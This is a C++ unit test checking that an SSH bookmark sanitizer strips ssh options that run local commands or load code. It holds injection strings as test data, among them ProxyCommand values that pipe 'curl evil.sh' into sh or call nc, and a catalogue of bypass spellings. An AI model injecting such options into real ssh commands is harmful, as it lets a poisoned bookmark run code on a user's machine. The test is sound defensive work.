// Feature-conformance test for spec.md — asserts that
// SshBookmark::sanitizeExtraArgs rejects ProxyCommand/LocalCommand/
// PermitLocalCommand in both single-token and space-separated forms,
// rejects stray non-option tokens ssh would take as the host, preserves
// all other options and their values, and reports rejected tokens.
//
// Also exercises the end-to-end toSshCommand to confirm a poisoned
// bookmark never emits the dangerous option to the final command.
//
// Exit 0 = all assertions hold. Non-zero = regression.

#include "../../_support/expect.h"
#include "../../_support/srcgrep.h"
#include "sshdialog.h"

#include <QProcess>

#include <gtest/gtest.h>

ANTS_TEST_SCOPE();

namespace {



void testSanitize() {
    // Single-token ProxyCommand
    {
        QStringList rej;
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-oProxyCommand=curl evil", &rej);
        expect(!safe.contains("-oProxyCommand=curl"),
               "sanitize: -oProxyCommand= rejected");
        expect(rej.contains("-oProxyCommand=curl"),
               "sanitize: out_rejected captures the token");
    }

    // Space-separated form
    {
        QStringList rej;
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-o ProxyCommand=curl", &rej);
        expect(safe.isEmpty(),
               "sanitize: -o ProxyCommand= (2-tok) rejects both tokens");
        expect(rej.size() == 2 && rej[0] == "-o" && rej[1] == "ProxyCommand=curl",
               "sanitize: out_rejected captures both tokens in order");
    }

    // Case variants on key name
    {
        auto safe = SshBookmark::sanitizeExtraArgs("-oproxycommand=x");
        expect(safe.isEmpty(),
               "sanitize: lowercase proxycommand= rejected");
    }
    {
        auto safe = SshBookmark::sanitizeExtraArgs("-oPROXYCOMMAND=x");
        expect(safe.isEmpty(),
               "sanitize: UPPER PROXYCOMMAND= rejected");
    }

    // LocalCommand + PermitLocalCommand
    {
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-oLocalCommand=x -oPermitLocalCommand=yes");
        expect(safe.isEmpty(),
               "sanitize: LocalCommand + PermitLocalCommand both rejected");
    }

    // Match exec — ssh_config(5) directive that runs a shell command.
    // The leftover `evil` is a stray word, rejected too (see testStrayTokens).
    {
        auto safe = SshBookmark::sanitizeExtraArgs("-oMatch=exec evil");
        expect(!safe.contains("-oMatch=exec"),
               "sanitize: -oMatch= rejected (prevents Match exec RCE)");
        expect(!safe.contains("evil"),
               "sanitize: leftover stray word rejected");
    }
    {
        auto safe = SshBookmark::sanitizeExtraArgs("-o Match=exec evil");
        expect(!safe.contains("-o") || !safe.contains("Match=exec"),
               "sanitize: -o Match= (two-tok) rejected");
    }

    // KnownHostsCommand — also executed via /bin/sh -c (OpenSSH 8.5+).
    {
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-oKnownHostsCommand=/tmp/evil");
        expect(safe.isEmpty(),
               "sanitize: -oKnownHostsCommand= rejected");
    }

    // Bare trailing `-o` — no value follows, so ssh would take
    // toSshCommand's `--` as its value. Rejected.
    {
        QStringList rej;
        auto safe = SshBookmark::sanitizeExtraArgs("-4 -o", &rej);
        expect(safe == QStringList{"-4"},
               "sanitize: bare trailing -o rejected",
               QString("got: %1").arg(safe.join(QStringLiteral(" | "))));
        expect(rej == QStringList{"-o"},
               "sanitize: bare trailing -o reported");
    }

    // Safe options pass through
    {
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-oStrictHostKeyChecking=no -p 2222 -4");
        expect(safe.size() == 4,
               "sanitize: safe -o + -p + -4 all preserved");
        expect(safe.contains("-oStrictHostKeyChecking=no"),
               "sanitize: StrictHostKeyChecking preserved");
        expect(safe.contains("-4"),
               "sanitize: -4 short flag preserved");
    }

    // Mixed safe + dangerous
    {
        QStringList rej;
        auto safe = SshBookmark::sanitizeExtraArgs(
            "-o StrictHostKeyChecking=no -oProxyCommand=nc evil 22 -L 8080:localhost:80",
            &rej);
        expect(safe.contains("-o"),
               "sanitize: keeps safe -o / key pair");
        expect(safe.contains("StrictHostKeyChecking=no"),
               "sanitize: keeps safe key=value");
        expect(!safe.contains("-oProxyCommand=nc"),
               "sanitize: drops dangerous");
        expect(safe.contains("-L"),
               "sanitize: keeps -L port forward");
        expect(rej.contains("-oProxyCommand=nc"),
               "sanitize: reports the dangerous one");
    }

    // Empty input
    {
        auto safe = SshBookmark::sanitizeExtraArgs("");
        expect(safe.isEmpty(), "sanitize: empty input → empty output");
    }

    // Whitespace-only input
    {
        auto safe = SshBookmark::sanitizeExtraArgs("   \t  ");
        expect(safe.isEmpty(), "sanitize: whitespace-only → empty output");
    }
}

// ANTS-5060 — spellings ssh accepts that the key-up-to-`=` check missed.
void testBypassForms() {
    auto rejected = [](const char *extra, const char *label) {
        const QStringList safe = SshBookmark::sanitizeExtraArgs(extra);
        for (const QString &t : safe)
            if (t.contains("ProxyCommand", Qt::CaseInsensitive)
                || t.startsWith("-F") || t.contains("Provider")
                || t.contains("Include")) {
                expect(false, label, QString("survived: %1").arg(safe.join(QStringLiteral(" | "))));
                return;
            }
        expect(true, label);
    };
    // ssh splits a keyword from its value at whitespace as well as `=`.
    // QProcess::splitCommand honours double quotes only, so these use them.
    rejected("-o \"ProxyCommand sh -c id\"", "bypass: -o KEY<space>VAL");
    rejected("\"-oProxyCommand sh -c id\"", "bypass: glued -oKEY<space>VAL");
    rejected("-o \" ProxyCommand=x\"", "bypass: leading space before key");
    // ssh's config parser strips double quotes from a keyword. splitCommand
    // reads `"""` as one literal quote, giving the token "ProxyCommand"=x.
    rejected("-o \"\"\"ProxyCommand\"\"\"=x", "bypass: quoted keyword");
    // getopt reads combined flags: -4oX is -4 then -o X.
    rejected("-4oProxyCommand=x", "bypass: combined -4oKEY=VAL");
    rejected("-4o ProxyCommand=x", "bypass: combined -4o KEY=VAL");
    // -F reads a whole config file, which can set ProxyCommand.
    rejected("-F /tmp/evil_config", "bypass: -F path");
    rejected("-F/tmp/evil_config", "bypass: glued -Fpath");
    rejected("-vF /tmp/evil_config", "bypass: combined -vF path");
    rejected("-o Include=/tmp/evil_config", "bypass: -o Include");
    // Options that load a shared library run local code as well.
    rejected("-oPKCS11Provider=/tmp/x.so", "bypass: PKCS11Provider");
    rejected("-o SecurityKeyProvider=/tmp/x.so", "bypass: SecurityKeyProvider");
    // ANTS-6443 — with -X, ssh runs the program XAuthLocation names; ssh
    // writes new host keys to UserKnownHostsFile.
    for (const char *key : {"XAuthLocation", "UserKnownHostsFile"}) {
        const QString extra = QStringLiteral("-X -o %1=/home/u/.bashrc").arg(key);
        const QStringList safe = SshBookmark::sanitizeExtraArgs(extra);
        expect(!safe.join(' ').contains(QLatin1String(key), Qt::CaseInsensitive),
               "bypass: path-valued key rejected",
               QString("survived: %1").arg(safe.join(QStringLiteral(" | "))));
    }
    {
        QStringList rej;
        const auto safe = SshBookmark::sanitizeExtraArgs("-I /tmp/x.so", &rej);
        expect(safe.isEmpty(), "bypass: -I library path rejected",
               QString("got: %1").arg(safe.join(QStringLiteral(" | "))));
        expect(rej.size() == 2, "bypass: -I reports both tokens");
    }
    {
        const auto safe = SshBookmark::sanitizeExtraArgs("-E /home/u/.bashrc");
        expect(safe.isEmpty(), "bypass: -E log path rejected",
               QString("got: %1").arg(safe.join(QStringLiteral(" | "))));
    }
    // Legitimate combined and argument-taking flags still pass.
    {
        const auto safe = SshBookmark::sanitizeExtraArgs(
            "-4v -i /home/u/.ssh/id_ed25519 -o ServerAliveInterval=30");
        expect(safe.size() == 5, "safe: -4v, -i path, -o key=val preserved",
               QString("got: %1").arg(safe.join(QStringLiteral(" | "))));
    }
}

// ANTS-6978 — ssh takes its first non-option argument as the host, so a
// stray word in extra args must not reach it.
void testStrayTokens() {
    for (const char *extra : {"other.host", "-4 other.host", "-", "--",
                              "-- other.host", "-C - -4"}) {
        QStringList rej;
        const QStringList safe = SshBookmark::sanitizeExtraArgs(extra, &rej);
        for (const QString &t : safe)
            expect(t.startsWith(QLatin1Char('-')) && t != "-" && t != "--",
                   "stray: only options survive",
                   QString("%1 -> %2").arg(extra, safe.join(QStringLiteral(" | "))));
        expect(!rej.isEmpty(), "stray: rejected token reported",
               QString("input: %1").arg(extra));
    }
    {
        SshBookmark bm;
        bm.host = "real.host";
        bm.extraArgs = "other.host";
        const QString cmd = bm.toSshCommand();
        expect(!cmd.contains("other.host"),
               "stray: e2e command never names the stray host",
               QString("got: %1").arg(cmd));
        expect(cmd.endsWith("-- 'real.host'") || cmd.endsWith("-- real.host"),
               "stray: e2e command ends with the bookmark's host",
               QString("got: %1").arg(cmd));
    }
    // An option's value is not a stray token, in either form.
    for (const char *extra : {"-p 2222", "-p2222", "-o StrictHostKeyChecking=yes",
                              "-i ~/.ssh/id", "-J jump", "-4 -l admin -L 8080:h:80"}) {
        QStringList rej;
        const QStringList safe = SshBookmark::sanitizeExtraArgs(extra, &rej);
        expect(safe == QProcess::splitCommand(QString::fromLatin1(extra)) && rej.isEmpty(),
               "stray: option value kept intact",
               QString("%1 -> %2").arg(extra, safe.join(QStringLiteral(" | "))));
    }
}

void testEndToEnd() {
    // A poisoned bookmark must NOT produce a ProxyCommand in the final
    // ssh command. This is the invariant that actually protects users.
    SshBookmark bm;
    bm.host = "example.com";
    bm.user = "root";
    bm.extraArgs = "-oProxyCommand=curl evil.sh | sh";

    const QString cmd = bm.toSshCommand();

    expect(!cmd.contains("ProxyCommand", Qt::CaseInsensitive),
           "e2e: toSshCommand drops the injected ProxyCommand",
           QString("got: %1").arg(cmd));
    expect(cmd.contains("root@example.com"),
           "e2e: host + user still present",
           QString("got: %1").arg(cmd));
    expect(cmd.contains("--"),
           "e2e: still emits -- host separator (prior fix intact)");
}

}  // namespace


TEST(SshExtraArgsSanitize, Sanitize) {
    const int before = expect_failures();
    testSanitize();
    if (expect_failures() > before) FAIL();
}

TEST(SshExtraArgsSanitize, BypassForms) {
    const int before = expect_failures();
    testBypassForms();
    if (expect_failures() > before) FAIL();
}

TEST(SshExtraArgsSanitize, StrayTokens) {
    const int before = expect_failures();
    testStrayTokens();
    if (expect_failures() > before) FAIL();
}

TEST(SshExtraArgsSanitize, EndToEnd) {
    const int before = expect_failures();
    testEndToEnd();
    if (expect_failures() > before) FAIL();
}


// ANTS-6978 — Save and both Connect buttons refuse refused extra args out
// loud (extraArgsAccepted names them) instead of dropping them silently.
TEST(SshExtraArgsSanitize, DialogNamesRefusedArgs) {
    const std::string src = ants_test::slurpFile(
        std::string(ANTS_SOURCE_DIR) + "/src/sshdialog.cpp");
    ASSERT_FALSE(src.empty());
    for (const char *sig : {"void SshDialog::onSave()",
                            "void SshDialog::onConnectNewTab()",
                            "void SshDialog::onConnectCurrent()"}) {
        const std::string body = ants_test::slurpFunctionBody(src, sig);
        EXPECT_NE(body.find("extraArgsAccepted(this, bm)"), std::string::npos)
            << sig << " must refuse dropped extra args with a message";
    }
}
